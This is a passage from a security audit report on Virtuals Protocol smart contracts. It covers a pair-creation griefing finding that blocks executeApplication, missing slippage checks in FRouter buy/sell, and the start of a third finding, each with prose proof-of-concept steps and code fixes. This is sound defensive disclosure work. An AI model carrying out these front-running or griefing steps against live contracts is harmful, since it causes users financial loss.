<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-332">0x04bytes</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-248">0xShitgem</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-262">anchabadze</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-446">levi_104</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-489">newspacexyz</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-823">oakcobalt</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-780">Olugbenga</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-481">patitonar</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-171">RaOne</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-347">shui</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-779">YouCrossTheLineAlfie</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L546">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L546</a></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L226">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/virtualPersona/AgentFactoryV4.sol#L226</a></p>
<h3 style="position:relative;" id="finding-description-1"><a class="anchor before" aria-label="finding description 1 permalink" href="#finding-description-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p><code>AgentFactoryV4</code> allowed user to register agent with existing/custom agent token. The flow is divided in two steps:</p>
<ol>
<li><code>initFromToken()</code>, where the user populates registration with required metadata.</li>
<li><code>executeApplication()</code>, where the application is executed, setting up agent token, dao and provision liquidity on uniswap v2.</li>
</ol>
<p>When an application is executed in <code>executeApplication()</code>, the contract will check whether the agent token is custom or not. When the agent token is custom, the contract will skip agent token creation step and instead directly create a new pair on uniswap v2 for liquidity provisioning. To prevent the user from provisioning liquidity before execution, the <code>_createPair()</code> internal function will check the existence of the pair. But this check is not enough because any user can permissionlessly create a new pair without provisioning liquidity. This condition can be used by attacker to prevent user from executing application by simply creating a transaction that calls <code>uniswapV2Factory.createPair(agentToken, assetToken)</code> before the victim calls <code>executeApplication()</code>. The execution will fail because the check <code>require(factory.getPair(tokenAddr, assetToken) == address(0), "pool already exists");</code> will revert since the pair is already created by the attacker in the previous transaction.</p>
<h3 style="position:relative;" id="impact-2"><a class="anchor before" aria-label="impact 2 permalink" href="#impact-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>User that register through <code>initFromToken()</code> unable to execute the application.</p>
<h3 style="position:relative;" id="proof-of-concept-4"><a class="anchor before" aria-label="proof of concept 4 permalink" href="#proof-of-concept-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>The attacker monitor the transaction that calls <code>agentFactoryV4.initFromToken()</code></li>
<li>Back-run that transaction with a transaction that calls <code>uniswapV2Factory.createPair(agentToken, assetToken)</code>.</li>
<li>The <code>executeApplication()</code> now will revert with pool exists error for the given application id.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-6"><a class="anchor before" aria-label="recommended mitigation steps 6 permalink" href="#recommended-mitigation-steps-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended Mitigation Steps</h3>
<p>Simply verifying <code>uniswapV2Factory.getPair(tokenAddr, assetToken) == address(0))</code> is not enough. When the token pair exists, it is crucial to check if the <code>totalSupply</code> of LP token is equal to 0. By doing that, we can make sure that there is no liquidity provisioned before the execution.</p>
<pre data-index="38" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">function _createPair(address tokenAddr) internal returns (address uniswapV2Pair_) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    IUniswapV2Factory factory = IUniswapV2Factory(IUniswapV2Router02(_uniswapRouter).factory());</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   uniswapV2Pair_ = uniswapV2Factory.getPair(tokenAddr, assetToken);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   // valid only if the pair doesn't exist or the total supply of the pair is 0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   require((uniswapV2Pair_ == address(0)) || (IUniswapV2Pair(uniswapV2Pair_).totalSupply() == 0), "pool already exists");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-   require(factory.getPair(tokenAddr, assetToken) == address(0), "pool already exists");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   if(uniswapV2Pair_ == address(0)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       uniswapV2Pair_ = factory.createPair(tokenAddr, assetToken);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    return (uniswapV2Pair_);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-02-missing-slippage-protection-on-buy-and-sell"><a class="anchor before" aria-label="m 02 missing slippage protection on buy and sell permalink" href="#m-02-missing-slippage-protection-on-buy-and-sell"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-4">[M-02] Missing slippage protection on buy and sell</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-718">EPSec</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-308">0x1982us</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-633">0x60scs</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-338">0xbc000</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-550">0xterrah</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-238">adam-idarrha</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-286">b1n4ry</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-618">bareli</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-371">BlackAdam</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-313">BowTiedOriole</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-488">bytesguard</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-743">chupinexx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-197">classic-k</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-611">CoheeYang</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-589">Damola0x</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-139">danzero</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-495">Ejineroz</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-787">Eniwealth</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-448">gregom</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-842">harsh123</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-721">jamshed</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-320">Jeremias</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-582">Kweks</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-417">mihailvichev</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-565">ngo</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-690">NHristov</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-680">PolarizedLight</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-462">PotEater</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-264">pro_king</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-830">Rorschach</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-822">SeveritySquad</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-133">Shinobi</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-333">shui</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-438">slowbugmayor</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-210">ThanatOS</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-256">TheCarrot</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-235">Vemus</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-503">YouCrossTheLineAlfie</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-532">zubyoz</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95-L163">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FRouter.sol#L95-L163</a></p>
<h3 style="position:relative;" id="finding-description-2"><a class="anchor before" aria-label="finding description 2 permalink" href="#finding-description-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>sell</code> and <code>buy</code> functions in the <code>FRouter</code> contract lack a slippage check to ensure that the <code>amountOut</code> (the amount of tokens received after the trade) is not less than a certain percentage of the expected <code>amountOut</code>. Slippage occurs when the price of a token changes between the time a transaction is submitted and when it is executed, often due to low liquidity or high volatility.</p>
<h3 style="position:relative;" id="impact-3"><a class="anchor before" aria-label="impact 3 permalink" href="#impact-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ol>
<li><strong>User Losses</strong>: Without a slippage check, users may receive significantly fewer tokens than expected, especially in volatile markets or low-liquidity pools.</li>
<li><strong>Front-Running Attacks</strong>: Malicious actors can exploit the lack of a slippage check by front-running transactions, manipulating the reserves to cause unfavorable price changes for the user.</li>
<li><strong>Reduced Trust</strong>: Users may lose confidence in the platform if they experience unexpected losses due to slippage, harming the platform’s reputation.</li>
<li><strong>Economic Exploits</strong>: Arbitrageurs or bots could exploit the lack of slippage protection to profit at the expense of users, draining liquidity from the pool.</li>
</ol>
<h3 style="position:relative;" id="proof-of-concept-5"><a class="anchor before" aria-label="proof of concept 5 permalink" href="#proof-of-concept-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>Deploy the <code>FRouter</code> contract and initialize it with a factory and asset token.</li>
<li>Set up a pair with low liquidity between <code>TokenA</code> and the asset token.</li>
<li>Call the <code>sell</code> or <code>buy</code> function with a large <code>amountIn</code> during a period of high volatility or low liquidity.</li>
<li>Observe that the <code>amountOut</code> received is significantly lower than expected, with no mechanism to revert the transaction.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-7"><a class="anchor before" aria-label="recommended mitigation steps 7 permalink" href="#recommended-mitigation-steps-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended Mitigation Steps</h3>
<p>To address this issue, add a slippage check in both the&nbsp;<code>sell</code>&nbsp;and&nbsp;<code>buy</code>&nbsp;functions. The functions should accept a&nbsp;<code>minAmountOut</code>&nbsp;parameter, which specifies the minimum acceptable&nbsp;<code>amountOut</code>. If the actual&nbsp;<code>amountOut</code>&nbsp;is less than&nbsp;<code>minAmountOut</code>, the transaction should revert.</p>
<p>Example fix for the&nbsp;<code>sell</code>&nbsp;function:</p>
<pre data-index="39" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">sell</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountIn</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenAddress</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">minAmountOut</span><span class="mtk1"> </span><span class="mtk3">// Add a parameter for slippage protection</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> </span><span class="mtk11">onlyRole</span><span class="mtk1">(</span><span class="mtk12">EXECUTOR_ROLE</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Zero addresses are not allowed."</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Zero addresses are not allowed."</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pairAddress</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">getPair</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk12">assetToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IFPair</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1"> = </span><span class="mtk11">IFPair</span><span class="mtk1">(</span><span class="mtk12">pairAddress</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IERC20</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1"> = </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountOut</span><span class="mtk1"> = </span><span class="mtk11">getAmountsOut</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk12">amountIn</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Ensure the amountOut is greater than or equal to minAmountOut</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">amountOut</span><span class="mtk1"> &gt;= </span><span class="mtk12">minAmountOut</span><span class="mtk1">, </span><span class="mtk8">"Slippage exceeded"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">pairAddress</span><span class="mtk1">, </span><span class="mtk12">amountIn</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">fee</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">sellTax</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">txFee</span><span class="mtk1"> = (</span><span class="mtk12">fee</span><span class="mtk1"> * </span><span class="mtk12">amountOut</span><span class="mtk1">) / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = </span><span class="mtk12">amountOut</span><span class="mtk1"> - </span><span class="mtk12">txFee</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">feeTo</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">taxVault</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">transferAsset</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">transferAsset</span><span class="mtk1">(</span><span class="mtk12">feeTo</span><span class="mtk1">, </span><span class="mtk12">txFee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">swap</span><span class="mtk1">(</span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">feeTo</span><span class="mtk1"> == </span><span class="mtk12">taxManager</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IBondingTax</span><span class="mtk1">(</span><span class="mtk12">taxManager</span><span class="mtk1">).</span><span class="mtk11">swapForAsset</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Similarly, apply the same logic to the&nbsp;<code>buy</code>&nbsp;function by adding a&nbsp;<code>minAmountOut</code>&nbsp;parameter and checking it against the calculated&nbsp;<code>amountOut</code>. This will protect users from unexpected losses due to slippage and improve the overall trading experience.</p>
<hr>
<h2 style="position:relative;" id="m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection"><a class="anchor before" aria-label="m 03 slippage protection in agenttaxdcasell and bondingtaxswapforasset is calculated at execution time effectively retrieving the very same price that the trade will be executing at ultimately providing no protection permalink" href="#m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-7">[M-03] Slippage protection in <code>AgentTax::dcaSell</code> and <code>BondingTax::swapForAsset</code> is calculated at execution time, effectively retrieving the very same price that the trade will be executing at, ultimately providing no protection</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-381">Jeremias</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-242">adam-idarrha</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-290">FavourOkerri</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-182">joicygiore</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-131">maze</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-83">mbuba666</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-293">odessos42</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-433">slowbugmayor</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-377">testnate</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-237">vasilishte</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L139-L143">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L139-L143</a></p>
